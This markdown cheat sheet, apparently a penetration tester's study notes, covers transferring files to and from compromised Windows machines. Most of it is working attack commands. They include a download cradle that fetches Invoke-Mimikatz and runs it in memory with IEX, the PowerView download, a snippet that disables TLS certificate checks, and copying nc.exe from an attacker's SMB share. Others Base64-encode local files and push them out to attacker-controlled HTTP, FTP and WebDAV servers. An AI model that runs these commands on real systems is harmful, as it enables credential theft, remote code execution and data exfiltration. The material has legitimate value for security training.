---
title: File_Transfer_Methods_Win
tags:
  - file_sharing
  - windows
created: 2025-02-25
---

# File Transfers
## Description
There are various methods to transfer files between systems using Windows native tools and PowerShell. 

## Download Operations

### PowerShell Base64 Encode & Decode
Encode a file into a Base64 string (useful when transferring via text channels).
```bash
md5sum id_rsa # For checking the file integrity
cat id_rsa | base64 -w 0; echo
    ```

On the target windows machine decode the string back into a file:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("base64_key"))

# For checking the file integrity
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

>[!Note]
> While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
### PowerShell Web Downloads
System.Net.WebClient can download files files via HTTP, HTTPS, or FTP.
Methods include`DownloadFile` and `DownloadFileAsync` for file downloads.
`DownloadString` and `DownloadStringAsync` for downloading as text.
#### Download a PowerShell script:
```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
   ```
#### Fileless Execution:
  Run downloaded code directly in memory using:
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

Common Issues:
**IE First-Launch Issues:** Add the `-UseBasicParsing` parameter if the Internet Explorer configuration is incomplete.
**SSL/TLS Errors:** Bypass certificate validation with:
```powershell
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  ```
#### Invoke-WebRequest
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
An extensive list of PowerShell download cradles can be found here
https://gist.github.com/HarmJ0y/bb48307ffa663256e239

### SMB Downloads
#### Setting up an SMB server
  Use `smbserver.py` from Impacket to create an SMB share.
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
    ```
#### Copying files
  On a Windows system, copy files using:
```powershell
copy \\<attacker_ip>\share\nc.exe
   ```
#### Authentication
If unauthenticated access is blocked, specify a username and password
  ```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
Mount the SMB share
```powershell
net use n: \\<attacker_ip>\share /user:test test
   ```
   
>[!NOTE]
>You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.
### FTP Downloads
#### Setting Up an FTP Server
`pyftpdlib` by default uses port 2121 and Anonymous authentication is enabled if we don't set a user and password.
```bash
sudo pip3 install pyftpdlib 
sudo python3 -m pyftpdlib --port 21
```

#### Downloading Files
  With PowerShell’s WebClient:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<attacker_ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Command File Method
 When we get a shell on a remote machine, **we may not have an interactive shell**. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
```powershell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Upload Operations

### Base64 Encoding for Upload

#### Encode a File in PowerShell
  Convert a file (e.g. `hosts`) to a Base64 string:
```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
    ```
#### Decode on attack machine:
  Use the base64 command to decode:
```bash
echo <base64_string> | base64 -d > hosts
```
### PowerShell Web Uploads

#### Installing a configured webServer with upload
```bash
pip3 install uploadserver
python3 -m uploadserver
```

#### Using a custom upload script
  We can use a PowerShell script `PSUpload.ps1` which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.
```powershell
# Execute fileless script PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Upload a file into an attacker machine
Invoke-FileUpload -Uri http://<target_ip>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

##### Alternative – Base64 Upload with Netcat:
An alternative to the above is to send base64 encoded file over a network and decode it on the receiving end.
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://<target_ip>:8000/ -Method POST -Body $b64

```
 
 We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
```bash
nc -lvnp 8000


echo <base64> | base64 -d -w 0 > hosts
```


### SMB and WebDav Uploads
Companies usually allow outbound traffic using HTTP and HTTPS protocols. Commonly enterprises don't allow the SMB protocol out of their internal network because this can open them up to potential attacks. An alternative is to run `SMB over HTTP with WebDav`

#### WebDav server
 Set up a WebDav server using Python modules `wsgidav` and `cheroot`:
 ```bash
sudo pip3 install wsgidav cheroot

#run
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
    ```
  
  Connect to the share using the special `DavWWWRoot` keyword
```powershell
dir \\<attacker_ip>\DavWWWRoot
```

>[!Note]
> `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

  Upload files by copying them to the share
```powershell
copy C:\path\to\a\file.zip \\<attacker_ip>\DavWWWRoot\

copy C:\path\to\a\file.zip \\<attacker_ip>\sharefolder\
```

>[!NOTE]
>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
### FTP Uploads

#### FTP Server with write permissions
```bash
sudo python3 -m pyftpdlib --port 21 --write
   ```
#### Powershell upload file
```powershell
(New-Object Net.WebClient).UploadFile('ftp://target_ip/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    ```
#### FTP command file
```powershell
echo open <attacker_ip> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Sources
- https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/
